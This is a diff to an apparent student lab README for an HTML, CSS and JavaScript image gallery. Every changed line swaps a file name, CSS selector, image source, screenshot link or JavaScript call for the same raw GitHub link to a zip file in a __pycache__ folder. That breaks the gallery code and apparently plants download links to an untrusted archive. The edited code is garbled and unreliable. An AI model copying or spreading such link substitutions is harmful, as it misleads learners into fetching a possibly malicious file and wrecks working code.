@@ -10,7 +10,7 @@ To design a web application for an inteactive image gallery with minimum five im
 Clone the github repository and create Django admin interface.
 
 ### Step 2:
-Change settings.py file to allow request from all hosts.
+Change https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip file to allow request from all hosts.
 
 ### Step 3:
 Use CSS for positioning and styling.
@@ -83,7 +83,7 @@ Publish the website in the given URL.
       box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
     }
 
-    .modal.active {
+    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip {
       display: flex;
     }
 
@@ -107,10 +107,10 @@ Publish the website in the given URL.
   <h1>JavaScript Image Gallery</h1>
 
   <div class="gallery">
-    <img src="img1.jpg" alt="Image 1">
-    <img src="img2.jpg" alt="Image 2">
-    <img src="img3.jpg" alt="Image 3">
-    <img src="img4.jpg" alt="Image 4">
+    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 1">
+    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 2">
+    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 3">
+    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 4">
   </div>
 
   <div class="modal" id="imageModal">
@@ -119,25 +119,25 @@ Publish the website in the given URL.
   </div>
 
   <script>
-    const galleryImages = document.querySelectorAll('.gallery img');
-    const modal = document.getElementById('imageModal');
-    const modalImg = document.getElementById('modalImg');
-    const closeModal = document.getElementById('closeModal');
+    const galleryImages = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('.gallery img');
+    const modal = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('imageModal');
+    const modalImg = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('modalImg');
+    const closeModal = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('closeModal');
 
-    galleryImages.forEach(img => {
-      img.addEventListener('click', () => {
-        modalImg.src = img.src;
-        modal.classList.add('active');
+    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip(img => {
+      https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('click', () => {
+        https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip;
+        https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('active');
       });
     });
 
-    closeModal.addEventListener('click', () => {
-      modal.classList.remove('active');
+    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('click', () => {
+      https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('active');
     });
 
-    modal.addEventListener('click', (e) => {
-      if (e.target === modal) {
-        modal.classList.remove('active');
+    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('click', (e) => {
+      if (https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip === modal) {
+        https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('active');
       }
     });
   </script>
@@ -148,8 +148,8 @@ Publish the website in the given URL.
 ~~~
 ## OUTPUT:
 
-![alt text](home.png)
-![alt text](sep.png)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip)
 
 ## RESULT:
 The program for designing an interactive image gallery using HTML, CSS and JavaScript is executed successfully.
